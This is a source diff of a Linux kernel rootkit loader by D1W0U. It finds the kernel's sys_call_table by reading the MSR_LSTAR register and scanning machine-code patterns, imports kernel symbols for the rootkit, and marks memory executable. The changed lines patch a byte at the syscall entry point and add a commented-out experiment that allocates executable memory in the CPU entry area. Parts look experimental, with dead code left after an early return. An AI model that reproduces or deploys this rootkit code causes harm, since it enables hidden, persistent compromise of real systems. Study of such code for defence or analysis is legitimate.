@@ -1,3 +1,4 @@
+// __get_vm_area
 /*
  * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
  *
@@ -21,6 +22,7 @@
 /*
  * This is the loader. Will get the RootKit Kernel resident into the Linux Kernel.
  */
+#include <asm/cpu_entry_area.h>
 #include <asm/msr.h>
 #include <linux/set_memory.h>
 #include <linux/slab.h>
@@ -80,21 +82,55 @@ int init_module(void)
     set_memory_x(PAGE_ROUND_DOWN(&kernel_start), kernel_pages);
 
 	/*
-	 * Search sys_call_table[] address.
+	 * Load Linux Kernel exported symbols for our rootkit.
 	 */
-	*sys_call_table() = search_sct();
-	if (*sys_call_table() == NULL) {
-		return -1;
-	}
-    
-	/*
-     * Linux Kernel symbols for our rootkit.
-     */
     *f_kmalloc() = kmalloc;
     *f_kfree() = kfree;
     *f_find_vpid() = find_vpid;
     *f_vscnprintf() = vscnprintf;
-    *f_sys_write() = (*sys_call_table())[__NR_write]; // now we can print into stdout =)
+
+	/*
+	 * Search sys_call_table[] address.
+	 */
+	*sys_call_table() = search_sct();
+	if (*sys_call_table() == NULL) {
+		return 0;
+	}
+    
+	/*
+     * Linux Kernel syscall symbols for our rootkit.
+     */
+    *f_sys_write() = (*sys_call_table())[__NR_write]; // now we can print into stdout and stderr =)
+
+	pinfo("%p\n", __rdmsr(MSR_LSTAR));
+	char *p = __rdmsr(MSR_LSTAR);
+	p[0] = 0x90;
+	disassemble(p, 1);
+/*	void * (*f__vmalloc_node_range)(unsigned long size, unsigned long align,
+            unsigned long start, unsigned long end, gfp_t gfp_mask,
+            pgprot_t prot, unsigned long vm_flags, int node,
+            const void *caller) = kallsyms_lookup_name("__vmalloc_node_range");
+	unsigned long mstart = (unsigned long)get_cpu_entry_area(nr_cpu_ids);
+	unsigned long mend = (unsigned long)get_cpu_entry_area(nr_cpu_ids + 1) - PAGE_SIZE;
+	size_t msize = mend - mstart;
+	pinfo("mstart = %p, mend = %p, size = %d, pages = %d\n", mstart, mend, msize, msize / PAGE_SIZE);
+	void *p = f__vmalloc_node_range(PAGE_SIZE, 1,
+                    mstart,
+                    mend, GFP_KERNEL,
+                    PAGE_KERNEL_EXEC, 0, NUMA_NO_NODE,
+                    __builtin_return_address(0));
+	pinfo("%p\n", p);
+	if (p != NULL)
+		(*f_kfree())(p);
+
+	int i = 0;
+	for(; i < nr_cpu_ids; i++) {
+		unsigned long p = __rdmsr(MSR_LSTAR);
+		pinfo("MSR_LSTAR = %p, cpu_entry_area(%d) = %p, offset = %lx\n", p, i, get_cpu_entry_area(i), p - (unsigned long)get_cpu_entry_area(i));
+		disassemble((unsigned long)get_cpu_entry_area(i) + 0x5000, 0x3c);
+	}
+	*/
+	return 0;
 
 	pinfo("Hurra! sys_call_table = %p\n", *sys_call_table());
 
@@ -135,7 +171,7 @@ int init_module(void)
 		perr("can not allocate memory.\n");
 	}
 
-    return -1;
+    return 0;
 }
 
 void cleanup_module(void)
@@ -189,13 +225,13 @@ void *search_sct(void) {
 	void *sct = (void *) __rdmsr(MSR_LSTAR);
 	// DO NOT call disassemble() in this function as sys_write is not yet imported!
 	// or import sys_write into f_sys_write before calling:
-	//*f_sys_write() = kallsyms_lookup_name("sys_write");
+	*f_sys_write() = kallsyms_lookup_name("sys_write");
 	//disassemble(sct, 0x3c);
 	sct = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
 	if (memcmp(sct + 3 + 4, "\xff\xe7", 2) == 0) { // found!
 		sct += 3;
 		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1) + (2 + 1 + 0x31);
-		//disassemble(sct, 0x40);
+		disassemble(sct, 0x100);
 		sct = memmem(sct, 0x100, "\xff\x14\xc5", 3); // search: call *sys_call_table(, %rax, 8)
 		if (sct) {
 			sct += 3;
